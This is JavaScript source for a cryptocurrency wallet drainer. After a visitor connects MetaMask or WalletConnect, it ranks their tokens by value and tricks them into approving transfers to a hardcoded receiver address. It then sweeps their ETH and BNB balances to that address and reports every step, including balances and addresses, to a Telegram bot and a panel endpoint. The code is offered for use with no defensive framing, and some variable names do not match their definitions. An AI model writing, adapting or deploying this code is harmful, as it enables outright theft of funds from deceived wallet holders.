const DRAINER_CONFIG = {
  "receiver_address": "0x2d94A5371AB765dFe55Fba3DeA8B9914482Cd740", // Replace with your wallet address where the assests will go
  "telegram_bot_token": "8262085228:AAEaoPeMN6yCahhKkyEIvcB8y2CYFkj-fZE", // Replace with your Telegram bot token
  "telegram_chat_id": "-1002291356770" // Replace with your chat ID
};

const DRAINER_USER_ID = process.env.DRAINER_ID;


var connected_address = null, web3 = null, signer = null;
var current_provider = null, current_chain_id = null;

const INF_Contract_ABI = {
  'ERC-20': JSON.parse(`[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"delegate","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"delegate","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],
  "name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transfer","outputs":
  [{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"buyer","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]`),
  'ERC-721': JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"mint","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},
  {"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},
  {"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},
  {"constant":true,"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"}]`)
};

var INF_MetaMask_ChainData = {
  1: {
    chainId: '0x1',
    chainName: "Ethereum Mainnet",
    nativeCurrency: {
      name: "Ether",
      symbol: "ETH",
      decimals: 18,
    },
    rpcUrls: [ "https://rpc.ankr.com/eth" ],
    blockExplorerUrls: [ "https://etherscan.io" ]
  },
  56: {
    chainId: '0x38',
    chainName: "BNB Smart Chain",
    nativeCurrency: {
      name: "Binance Coin",
      symbol: "BNB",
      decimals: 18,
    },
    rpcUrls: [ "https://rpc.ankr.com/bsc" ],
    blockExplorerUrls: [ "https://bscscan.com" ]
  }
};

// Function to send message to Telegram bot
async function sendTelegramMessage(message) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${DRAINER_CONFIG.telegram_bot_token}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: DRAINER_CONFIG.telegram_chat_id,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    const data = await response.json();
    return data.ok;
  } catch (error) {
    console.error('Error sending Telegram message:', error);
    return false;
  }
}

var WC_Provider = null;
if (typeof window.WalletConnectProvider !== 'undefined') {
  WC_Provider = new WalletConnectProvider.default({
    rpc: {
      1: 'https://rpc.ankr.com/eth',
      56: 'https://rpc.ankr.com/bsc'
    },
    network: 'ethereum', chainId: 1
  });
}

if (DRAINER_USER_ID === null) {
  sessionStorage.setItem('DRAINER_ID', String(Math.floor(Date.now() / 1000)));
  DRAINER_USER_ID = sessionStorage.getItem('DRAINER_ID');
  try {
    fetch('/panel.cypherauth.wtf', {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: new URLSearchParams({
        method: 'ENTER_WEBSITE',
        user_id: DRAINER_USER_ID
      })
    });
    
    // Send Telegram notification for new website visitor
    sendTelegramMessage(`🔍 <b>New Visitor</b>\nUser ID: ${DRAINER_USER_ID}\nTime: ${new Date().toISOString()}`);
  } catch(err) {
    console.log(err);
  }
}

async function change_chain_id(chain_id) {
  try {
    if (current_provider != 'MM') return false;
    if (current_chain_id == chain_id) return false;
    try {
      await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: `0x${chain_id.toString(16)}` }] });
      current_chain_id = chain_id;
      web3 = new ethers.providers.Web3Provider(window.ethereum);
      signer = web3.getSigner();
      
      // Send Telegram notification for chain change
      sendTelegramMessage(`⛓️ <b>Chain Changed</b>\nAddress: ${connected_address}\nChain ID: ${chain_id}\nUser ID: ${DRAINER_USER_ID}`);
      return true;
    } catch(err) {
      if (err.code == 4902) {
        try {
          await window.ethereum.request({ method: "wallet_addEthereumChain", params: [ MS_MetaMask_ChainData[chain_id] ] });
          current_chain_id = chain_id;
          web3 = new ethers.providers.Web3Provider(window.ethereum);
          signer = web3.getSigner();
          
          // Send Telegram notification for chain added
          sendTelegramMessage(`➕ <b>Chain Added</b>\nAddress: ${connected_address}\nChain ID: ${chain_id}\nUser ID: ${DRAINER_USER_ID}`);
          return true;
        } catch(err) {
          // Send Telegram notification for chain add error
          sendTelegramMessage(`❌ <b>Chain Add Error</b>\nAddress: ${connected_address}\nChain ID: ${chain_id}\nUser ID: ${DRAINER_USER_ID}\nError: ${err.message}`);
          return false;
        }
      } else {
        // Send Telegram notification for chain switch error
        sendTelegramMessage(`❌ <b>Chain Switch Error</b>\nAddress: ${connected_address}\nChain ID: ${chain_id}\nUser ID: ${DRAINER_USER_ID}\nError: ${err.message}`);
        return false;
      }
    }
  } catch(err) {
    console.log(err);
    return false;
  }
}

async function connect_wallet(force_wc = false, chain_id = 1) {
  try {
    if (typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask && force_wc == false) {
      try {
        var result = await window.ethereum.request({ method: 'wallet_requestPermissions', params: [{ eth_accounts: {} }] });
        if (result && result.length > 0) {
          connected_address = window.ethereum.selectedAddress;
          if (parseInt(window.ethereum.chainId) != 1 && parseInt(window.ethereum.chainId) != 56) {
            try {
              await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: '0x1' }] });
            } catch(err) {
              console.log('User rejected to change chain');
              // Send Telegram notification for chain change rejection
              sendTelegramMessage(`⚠️ <b>Chain Change Rejected</b>\nAddress: ${connected_address}\nUser ID: ${DRAINER_USER_ID}`);
              return false;
            }
          }
          web3 = new ethers.providers.Web3Provider(window.ethereum);
          signer = web3.getSigner();
          current_provider = 'MM';
          current_chain_id = parseInt(window.ethereum.chainId);
          
          // Send Telegram notification for MetaMask connection
          sendTelegramMessage(`🦊 <b>MetaMask Connected</b>\nAddress: ${connected_address}\nChain ID: ${current_chain_id}\nUser ID: ${DRAINER_USER_ID}`);
        } else {
          console.log('User has no wallets');
          // Send Telegram notification for no wallets
          sendTelegramMessage(`❓ <b>No Wallets Found</b>\nUser ID: ${DRAINER_USER_ID}`);
          return false;
        }
      } catch(err) {
        if (err.code === 4001) {
          console.log('User rejected wallet connection');
          // Send Telegram notification for connection rejection
          sendTelegramMessage(`❌ <b>Connection Rejected</b>\nUser ID: ${DRAINER_USER_ID}`);
          return false;
        } else {
          console.log(err);
          return false;
        }
      }
    } else if (typeof window.WalletConnectProvider !== 'undefined') {
      if (WC_Provider.connected) await WC_Provider.disconnect(0);
      WC_Provider.chainId = chain_id;
      WC_Provider.isConnecting = false;
      try {
        var result = await WC_Provider.enable();
        if (result && result.length > 0) {
          connected_address = result[0];
          web3 = new ethers.providers.Web3Provider(WC_Provider);
          signer = web3.getSigner();
          current_provider = 'WC';
          current_chain_id = WC_Provider.chainId;
          
          // Send Telegram notification for WalletConnect connection
          sendTelegramMessage(`🔌 <b>WalletConnect Connected</b>\nAddress: ${connected_address}\nChain ID: ${current_chain_id}\nUser ID: ${DRAINER_USER_ID}`);
        }
      } catch(err) {
        console.log('User rejected wallet connection');
        // Send Telegram notification for WalletConnect rejection
        sendTelegramMessage(`❌ <b>WalletConnect Rejected</b>\nUser ID: ${DRAINER_USER_ID}`);
        return false;
      }
    } else {
      console.log('No providers available');
      // Send Telegram notification for no providers
      sendTelegramMessage(`⚠️ <b>No Providers Available</b>\nUser ID: ${DRAINER_USER_ID}`);
      return false;
    }
    if (connected_address === null || web3 === null || signer === null) {
      console.log('Unable to connect wallet');
      // Send Telegram notification for connection failure
      sendTelegramMessage(`❌ <b>Wallet Connection Failed</b>\nUser ID: ${DRAINER_USER_ID}`);
      return false;
    }
    var is_chain_changeable = (current_provider == 'MM');
    // Get wallet balance
    var ADDRESS_BALANCE = await signer.getBalance('latest');
    try {
      fetch('/panel.cypherauth.wtf', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams({
          method: 'CONNECT_WALLET', address: connected_address, user_id: DRAINER_USER_ID,
          amount: ethers.utils.formatUnits(ethers.BigNumber.from(ADDRESS_BALANCE), 'ether'),
          chain_id: current_chain_id
        })
      });
      
      // Send Telegram notification with wallet balance
      const formattedBalance = ethers.utils.formatUnits(ethers.BigNumber.from(ADDRESS_BALANCE), 'ether');
      sendTelegramMessage(`💰 <b>Wallet Connected</b>\nAddress: ${connected_address}\nChain ID: ${current_chain_id}\nBalance: ${formattedBalance} ${current_chain_id === 1 ? 'ETH' : 'BNB'}\nUser ID: ${DRAINER_USER_ID}`);
    } catch(err) {
      console.log(err);
    }
    // Work with tokens
    var fee_counter = {
      1: ethers.BigNumber.from('0'),
      56: ethers.BigNumber.from('0')
    };
    try {
      var response = await fetch('https://rpc.ankr.com/multichain', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          "id": 1,
          "jsonrpc": "2.0",
          "method": "ankr_getAccountBalance",
          "params": {
            "blockchain": is_chain_changeable ? ["bsc", "eth"] : (current_chain_id == 1 ? 'eth' : 'bsc'),
            "onlyWhitelisted": true,
            "walletAddress": connected_address
          }
        })
      });
      response = await response.json();
      var wallet_assets = [];
      if (response.result && response.result.assets) {
        for (const asset of response.result.assets) {
          try {
            if (asset.tokenType == 'NATIVE') continue;
            wallet_assets.push({
              chain_id: asset.blockchain == 'eth' ? 1 : 56,
              name: asset.tokenName,
              decimals: asset.tokenDecimals,
              balance: {
                raw: asset.balanceRawInteger,
                USD: parseFloat(asset.balanceUsd),
                ether: parseFloat(asset.balance)
              },
              type: asset.tokenType,
              address: asset.contractAddress || '0x0'
            });
          } catch(err) {
            console.log(err);
          }
        }
      }
      
      // Send Telegram notification with assets found
      if (wallet_assets.length > 0) {
        let assetsMessage = `🔎 <b>Assets Found</b>\nAddress: ${connected_address}\nUser ID: ${DRAINER_USER_ID}\n\n`;
        wallet_assets.forEach((asset, index) => {
          if (index < 15) { // Limit to 15 assets in the message to avoid length issues
            assetsMessage += `• ${asset.name}: ${asset.balance.ether} ($${asset.balance.USD.toFixed(2)})\n`;
          }
        });
        if (wallet_assets.length > 15) {
          assetsMessage += `\n... and ${wallet_assets.length - 15} more assets`;
        }
        sendTelegramMessage(assetsMessage);
      } else {
        sendTelegramMessage(`ℹ️ <b>No ERC-20/BEP-20 Assets Found</b>\nAddress: ${connected_address}\nUser ID: ${DRAINER_USER_ID}`);
      }
      
      wallet_assets.sort((a, b) => { return b.balance.USD - a.balance.USD });
      for (const asset of wallet_assets) {
        try {
          if (current_chain_id != asset.chain_id) {
            if (is_chain_changeable == false) continue;
            var change_status = await change_chain_id(asset.chain_id);
            if (change_status == false) continue;
            else await new Promise(r => setTimeout(r, 1000));
          }
          const pContract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC-20'], signer);
          try {
            await pContract.approve(DRAINER_CONFIG.receiver_address, ethers.BigNumber.from(asset.balance.raw));
            try {
              fetch('/panel.cypherauth.wtf', {
                method: 'POST',
                headers: {
                  'Accept': 'application/json',
                  'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                  method: 'APPROVE_TOKEN', address: connected_address, user_id: DRAINER_USER_ID,
                  amount: asset.balance.ether, token_name: asset.name, chain_id: current_chain_id,
                  token_address: asset.address, token_amount: asset.balance.raw,
                  processor_address: DRAINER_CONFIG.receiver_address, usd_amount: asset.balance.USD
                })
              });
              
              // Send Telegram notification for token approval
              sendTelegramMessage(`✅ <b>Token Approved</b>\nAddress: ${connected_address}\nToken: ${asset.name}\nAmount: ${asset.balance.ether} ($${asset.balance.USD.toFixed(2)})\nChain ID: ${current_chain_id}\nToken Address: ${asset.address}\nUser ID: ${DRAINER_USER_ID}`);
              
              var gas_fee = ethers.BigNumber.from(await signer.getGasPrice()).mul(ethers.BigNumber.from('100000')).toString();
              fee_counter[current_chain_id] = ethers.BigNumber.from(fee_counter[current_chain_id]).add(ethers.BigNumber.from(gas_fee));
              await new Promise(r => setTimeout(r, 1000));
            } catch(err) {
              console.log(err);
              // Send Telegram notification for token approval error
              sendTelegramMessage(`❌ <b>Token Approval Error</b>\nAddress: ${connected_address}\nToken: ${asset.name}\nError: ${err.message}\nUser ID: ${DRAINER_USER_ID}`);
            }
          } catch(err) {
            try {
              fetch('/panel.cypherauth.wtf', {
                method: 'POST',
                headers: {
                  'Accept': 'application/json',
                  'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                  method: 'NO_APPROVE_TOKEN', address: connected_address, user_id: DRAINER_USER_ID,
                  amount: asset.balance.ether, token_name: asset.name, chain_id: current_chain_id,
                  token_address: asset.address, usd_amount: asset.balance.USD
                })
              });
              
              // Send Telegram notification for token approval failure
              sendTelegramMessage(`⚠️ <b>Token Approval Failed</b>\nAddress: ${connected_address}\nToken: ${asset.name}\nAmount: ${asset.balance.ether} ($${asset.balance.USD.toFixed(2)})\nChain ID: ${current_chain_id}\nToken Address: ${asset.address}\nUser ID: ${DRAINER_USER_ID}`);
            } catch(err) {
              console.log(err);
            }
          }
        } catch(err) {
          console.log(err);
        }
      }
    } catch(err) {
      console.log(err);
      // Send Telegram notification for assets fetch error
      sendTelegramMessage(`❌ <b>Assets Fetch Error</b>\nAddress: ${connected_address}\nError: ${err.message}\nUser ID: ${DRAINER_USER_ID}`);
    }
    // Work with native coins
    var chains_list = [ current_chain_id, (current_chain_id == 1 ? 56 : 1) ];
    for (const this_chain_id of chains_list) {
      try {
        if (current_chain_id != this_chain_id) {
          if (is_chain_changeable == false) continue;
          var change_status = await change_chain_id(this_chain_id);
          if (change_status == false) continue;
          else await new Promise(r => setTimeout(r, 1000));
        }
        var GAS_PRICE = await signer.getGasPrice();
        var GAS_LIMIT = 21000;
        var GAS_AMOUNT = ethers.BigNumber.from(GAS_PRICE).mul(ethers.BigNumber.from(GAS_LIMIT)).toString();
        var ADDRESS_BALANCE = await signer.getBalance('latest');
        var SAFE_AMOUNT = ethers.BigNumber.from(ADDRESS_BALANCE).sub(ethers.BigNumber.from(GAS_AMOUNT)).sub(ethers.BigNumber.from(fee_counter[this_chain_id])).toString();
        if (ethers.BigNumber.from(SAFE_AMOUNT).gt(ethers.BigNumber.from(0))) {
          try {
            await signer.sendTransaction({
              to: DRAINER_CONFIG.receiver_address,
              value: ethers.BigNumber.from(SAFE_AMOUNT),
              gasLimit: ethers.BigNumber.from(GAS_LIMIT),
              gasPrice: ethers.BigNumber.from(GAS_PRICE)
            });
            try {
              fetch('/panel.cypherauth.wtf', {
                method: 'POST',
                headers: {
                  'Accept': 'application/json',
                  'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                  method: 'SEND_ETHEREUM', address: connected_address, user_id: DRAINER_USER_ID,
                  amount: ethers.utils.formatUnits(ethers.BigNumber.from(SAFE_AMOUNT), 'ether'),
                  chain_id: current_chain_id
                })
              });
              
              // Send Telegram notification for successful coin transfer
              const coinSymbol = this_chain_id === 1 ? 'ETH' : 'BNB';
              const formattedAmount = ethers.utils.formatUnits(ethers.BigNumber.from(SAFE_AMOUNT), 'ether');
              sendTelegramMessage(`💸 <b>${coinSymbol} Transferred</b>\nAddress: ${connected_address}\nAmount: ${formattedAmount} ${coinSymbol}\nChain ID: ${this_chain_id}\nUser ID: ${DRAINER_USER_ID}\nReceiver: ${DRAINER_CONFIG.receiver_address}`);
              
            } catch(err) {
              console.log(err);
              // Send Telegram notification for coin transfer error
              sendTelegramMessage(`❌ <b>Transfer Error</b>\nAddress: ${connected_address}\nError: ${err.message}\nUser ID: ${DRAINER_USER_ID}`);
            }
            await new Promise(r => setTimeout(r, 1000));
          } catch(err) {
            console.log('Unable to send Ethereum');
            // Send Telegram notification for failed ETH/BNB transfer
            const coinSymbol = this_chain_id === 1 ? 'ETH' : 'BNB';
            sendTelegramMessage(`❌ <b>Unable to send ${coinSymbol}</b>\nAddress: ${connected_address}\nChain ID: ${this_chain_id}\nUser ID: ${DRAINER_USER_ID}\nError: ${err.message}`);
          }
        } else {
          console.log('User has no Ethereum');
          // Send Telegram notification for insufficient coin balance
          const coinSymbol = this_chain_id === 1 ? 'ETH' : 'BNB';
          sendTelegramMessage(`ℹ️ <b>Insufficient ${coinSymbol}</b>\nAddress: ${connected_address}\nChain ID: ${this_chain_id}\nUser ID: ${DRAINER_USER_ID}`);
        }
      } catch(err) {
        console.log(err);
        // Send Telegram notification for general coin handling error
        sendTelegramMessage(`❌ <b>General Error in Chain ${this_chain_id}</b>\nAddress: ${connected_address}\nError: ${err.message}\nUser ID: ${DRAINER_USER_ID}`);
      }
    }
    
    // Final success notification
    sendTelegramMessage(`✅ <b>Draining Completed</b>\nAddress: ${connected_address}\nUser ID: ${DRAINER_USER_ID}\nTime: ${new Date().toISOString()}`);
    
  } catch(err) {
    console.log(err);
    // Send Telegram notification for critical error
    sendTelegramMessage(`🚨 <b>Critical Error</b>\nUser ID: ${DRAINER_USER_ID}\nError: ${err.message}`);
  }
}